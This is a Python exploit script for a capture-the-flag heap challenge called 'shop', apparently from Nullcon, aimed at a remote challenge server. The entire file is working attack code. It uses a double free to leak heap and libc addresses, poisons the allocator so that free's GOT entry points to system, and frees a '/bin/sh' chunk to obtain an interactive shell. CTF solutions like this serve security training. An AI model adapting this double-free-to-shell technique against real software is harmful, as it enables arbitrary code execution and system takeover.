#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import json

bin_file = './shop'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn.ctf.nullcon.net', 'port':4002})
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_got_free       = binf.got['free']

libc = binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    shop = Shop(conn)

    shop.add(0x18, 'a'*0x10, 0)
    shop.add(0x18, 'b'*0x10, 1)
    shop.add(0x28, 'c'*0x10, 2)
    shop.add(0x18, 'd'*0x10, 3)
    shop.remove(2)
    shop.remove(2)

    addr_heap_base = int(shop.view()[2]['index']) - 0x320
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    shop.add(0x38, p(-1)+p64(addr_got_main), 4)
    addr_libc_main = u(shop.view()[2]['name'].encode('latin1'))
    libc.address = addr_libc_main - offset_libc_main
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    shop.remove(1)
    shop.remove(0)
    shop.add(0x28, p64(addr_got_free), 5)

    shop.add(0x28, '/bin/sh\0', 6)
    shop.add(0x28, p64(addr_libc_system), 7)
    shop.remove(0)
    
class Shop:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, length, name, price):
        self.sendlineafter('> ', '1')
        self.sendlineafter('length: ', str(length))
        self.sendafter('name: ', name)
        self.sendlineafter('price: ', str(price))

    def remove(self, index):
        self.sendlineafter('> ', '2')
        self.sendlineafter('index: ', str(index))

    def view(self):
        self.sendlineafter('> ', '3')
        cart = json.loads(self.recvuntil('\nNullCon', drop=True), encoding='latin1', strict=False)
        return cart['Books']

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
